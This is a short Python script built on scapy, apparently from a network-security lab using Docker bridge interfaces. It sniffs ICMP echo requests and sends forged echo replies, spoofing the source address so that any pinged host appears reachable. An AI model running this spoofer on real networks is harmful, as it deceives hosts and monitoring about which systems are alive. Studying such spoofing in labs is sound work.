#!/usr/bin/env python3
from scapy.all import *
import signal
import sys

ICMP_TYPES = {"ECHO_REPLY": 0, "ECHO_REQ": 8}
interface = "br-e7dc6f18ef8e"
interfaces = ["br-e7dc6f18ef8e", "enp0s3"]


def print_icmp_pkt(pkt):
    # if (pkt[ICMP].type == 8 and pkt[IP].src == ip_src):
    if pkt[ICMP].type == ICMP_TYPES["ECHO_REQ"]:
        reply_pkt = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src)
            / ICMP(type=ICMP_TYPES["ECHO_REPLY"], id=pkt[ICMP].id, seq=pkt[ICMP].seq)
            / pkt[Raw]
        )
        send(reply_pkt, verbose=False)


print("INFO: Starting ping spoofer ...")

icmp_sniffer = AsyncSniffer(iface=interfaces, filter="icmp", prn=print_icmp_pkt)


print("INFO: Started")
print("INFO: Use CTRL-C to exit")
print("\n\n")

icmp_sniffer.start()


def signal_handler(SIGNUM, frame):
    print("\n\n")
    print("INFO: Exiting gracefully ...")
    icmp_sniffer.stop()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.pause()
